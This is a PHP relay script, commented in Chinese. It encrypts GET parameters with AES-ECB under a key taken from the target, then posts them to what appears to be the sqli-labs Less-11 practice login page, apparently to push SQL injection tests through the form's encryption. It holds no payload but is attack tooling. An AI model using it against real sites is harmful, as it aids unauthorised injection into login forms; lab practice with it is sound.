<?php  //注意：mcrypt 扩展已经在 PHP 7.2 中被弃用，建议使用其他加密扩展或者使用 PHP 7.1 及以下版本。
// 接收GET请求中的参数,需要更多参数可以自加自减
$param1 = $_GET['param1'];
$param2 = $_GET['param2'];

// 加密密钥,目标网站上参考文章进行扣取
$key = "akcdefg3bcdkfg12";   


$block_size = mcrypt_get_block_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_ECB);   //加密模式

//填充方式
$pad_size = $block_size - (strlen($param1) % $block_size);
$param1 .= str_repeat(chr($pad_size), $pad_size);

//param2处理
$pad_size = $block_size - (strlen($param2) % $block_size);
$param2 .= str_repeat(chr($pad_size), $pad_size);

//参数加密
$param1 = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $param1, MCRYPT_MODE_ECB);
$param2 = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $param2, MCRYPT_MODE_ECB);

// 对密文进行base64
$param1_base64 = base64_encode($param1);
$param2_base64 = base64_encode($param2);

// 设置POST请求中的参数,需要注意传参的个数以及名称
$sub = "Submit";
$data = array(
    'uname' => $param1_base64,
    'passwd' => $param2_base64,
    'submit' => $sub
);

//确认加密结果
// foreach ($data as $key1 => $value) {
//      echo "Key: $key1, Value: $value\n";
// }

//向目标网站发送post请求
// 设置POST请求的URL和请求头信息
$url = 'http://10.10.70.6/sqli/Less-11/index.php';   //目标 URL
$headers = array(                             //请求头根据需求自加自减
    'Content-Type: application/x-www-form-urlencoded',
    'Cookie: cookie_name=cookie_value',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
);

// 初始化curl
$ch = curl_init();

// 设置curl的相关参数
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

// 执行curl请求
$response = curl_exec($ch);

// 关闭curl资源
curl_close($ch);

// 输出响应结果
echo $response;
?>